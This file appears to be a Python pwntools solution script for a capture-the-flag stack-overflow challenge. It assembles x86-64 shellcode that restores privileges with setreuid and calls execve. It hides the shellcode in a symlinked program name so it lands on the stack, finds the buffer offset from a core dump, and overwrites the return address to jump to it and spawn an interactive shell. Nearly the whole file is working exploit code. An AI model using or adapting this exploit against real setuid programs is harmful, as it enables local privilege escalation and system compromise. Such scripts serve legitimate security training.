from pwn import *
import os

DEBUG = False 

context.arch = "x86-64"
context.bits = 64

shellcode = asm('''
push   0x6c
pop    rax
syscall

push   rax
push   rax
pop    rdi
pop    rsi
push   0x72
pop    rax
syscall

push   0x31
pop    rax
xor    al,0x31
push   rax
push   rax
pop    rsi
pop    rdx
push   0x7a

push   rsp
pop    rdi
push   0x3b
pop    rax
syscall
''')



print(disasm(shellcode))

env = {"PATH":"$PATH:."}
file = './stack-ovfl-no-envp-no-argv-64'
shellcode_file = f'./{shellcode.decode("utf8")}'
if not os.path.isfile(shellcode_file):
    os.symlink(file, shellcode_file)


# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(shellcode_file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
shellcode_address = core.stack.find(shellcode)
print(shellcode_address)
max_len = cyclic(10000).find(p64(core.fault_addr))
print(max_len)
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(shellcode_file, env=env, gdbscript='''
b main
b *0x0000555555554826
continue
''')
else:
    io = process(shellcode_file, env=env)

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


payload = int(max_len) * b"A" + p64(shellcode_address)
io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Hello', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
